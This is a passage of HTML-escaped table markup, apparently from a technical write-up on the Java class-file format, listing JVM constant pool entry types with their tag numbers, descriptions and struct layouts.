pre-wrap;\"&gt;CONSTANT_Long&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;5&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;8-byte long&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_Long_info {&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u1 tag;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u4 high_bytes;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u4 low_bytes;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr style=\"height: 23.5pt;\"&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;a href=\"https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.1\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_Double&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;6&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;8-byte double&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_Double_info {&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u1 tag;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u4 high_bytes;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u4 low_bytes;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr style=\"height: 23.5pt;\"&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;a href=\"https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.1\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_Class&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;7&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Reference to a class. Links to a Utf8 constant describing the name.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_Class_info {&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u1 tag;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 name_index;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr style=\"height: 23.5pt;\"&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;a href=\"https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.3\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_String&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;8&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;A JVM “String”. Links to a UTF8 constant.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_String_info {&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u1 tag;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 string_index;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr style=\"height: 23.5pt;\"&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;a href=\"https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.2\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_Fieldref&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;a href=\"http://constant_methodref\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_Methodref&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;a href=\"http://constant_methodref\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_InterfaceMethodref&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;9&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;10&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;11&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Reference to a class field or method. Links to a Class constant&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_Fieldref_info {&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u1 tag;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 class_index;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 name_and_type_index;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_Methodref_info {&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u1 tag;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 class_index;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 name_and_type_index;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_InterfaceMethodref_info {&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u1 tag;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 class_index;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 name_and_type_index;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr style=\"height: 23.5pt;\"&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;a href=\"http://constant_nameandtype_info\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_NameAndType&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;12&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Describes a field or method.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span 